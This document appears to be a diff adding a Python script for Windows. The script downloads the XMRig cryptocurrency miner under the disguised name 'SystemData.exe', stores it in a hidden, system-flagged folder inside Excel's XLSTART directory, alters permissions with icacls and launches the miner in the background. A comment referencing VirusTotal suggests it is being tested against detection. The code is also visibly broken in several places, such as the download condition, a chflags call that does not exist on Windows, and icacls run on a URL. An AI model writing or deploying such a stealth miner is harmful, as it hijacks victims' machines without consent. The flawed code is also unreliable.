@@ -1,0 +1,53 @@
+import os
+import json
+import requests
+import subprocess
+import shutil
+import urllib.request
+import ctypes
+from urllib.parse import urlparse
+
+# https://www.virustotal.com/gui/home/upload
+
+# Windows Services (system-wide) → can run before login, keep running after logout.
+ATTRIBUTE_HIDDEN = 0x02
+ATTRIBUTE_SYSTEM = 0x04
+
+# Specify the URL of the program you want to download
+url = "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-windows-x64.zip//SystemData.exe" # url for Windows Get the filename and extension from the URL
+
+command = f'icacls "{url}" /grant Administrators:F /inheritance:r'
+
+filename, file_extension = urlparse(url).path.split(".")
+
+log_folder = os.path.join(os.environ['APPDATA'], "Windows", "Excel", "XLSTART", "KEYXL" )
+if not os.path.exists(log_folder):
+    os.makedirs(log_folder)
+
+attrs = ctypes.windll.kernel32.GetFileAttributesW(log_folder)
+ctypes.windll.kernel32.SetFileAttributesW(
+    log_folder,
+    attrs | ATTRIBUTE_HIDDEN | ATTRIBUTE_SYSTEM
+)
+
+# Create a new directory for the system app
+app_dir = os.path.join(os.environ["APPDATA"], "Windows", "Excel", "XLSTART", "KEYXL" ) # os.path.join("C:\\Users\\YourName\\Documents"
+if not os.path.exists(app_dir): # r"C:\Users\YourName\Documents\SystemData"
+    os.makedirs(app_dir)
+
+# Download the file and save it to the new directory
+if not os.path.exists(app_dir):
+ response = requests.get(url) 
+ with open(os.path.join(app_dir, filename + ".ext"), "wb") as file: 
+  file.write(response.content)
+
+# Make the file invisible by changing its attributes
+file_attributes = os.stat(os.path.join(app_dir, filename + ".ext"))
+os.chflags(os.path.join(app_dir, filename + ".ext"), file_attributes.st_flags ^ 0x080)
+
+Fer_dir = os.path.join(os.environ["APPDATA"], "Windows", "Excel", "XLSTART", "KEYXL", "xmrig-6.24.0-windows-x64.zip", "xmrig-6.24.0", "xmrig.exe",)
+
+# Run the file in the background using subprocess
+subprocess.run(command, shell=True, check=True)
+subprocess.Popen([Fer_dir]) # sys.executable, this would open the file thinking that it is .py
+
